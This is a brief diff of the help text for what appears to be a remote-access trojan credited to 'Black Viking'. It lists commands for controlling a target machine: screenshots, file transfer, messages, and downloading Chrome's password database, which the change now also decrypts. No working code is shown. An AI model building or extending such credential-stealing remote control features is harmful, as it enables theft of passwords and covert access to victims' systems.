@@ -8,7 +8,7 @@ Coded By Black Viking
 	Commands:
 		help()                  : Show this message.
 		screenshot()            : Take a screenshot on client and send image file to server.
-		chrome_db               : Download Chrome's password database.
+		chrome_db               : Download Chrome's password database and decrypt it.
 		download                : Download files from client.
 		upload                  : Upload files to client from server.
 		message TEXT            : Show messages on target system.
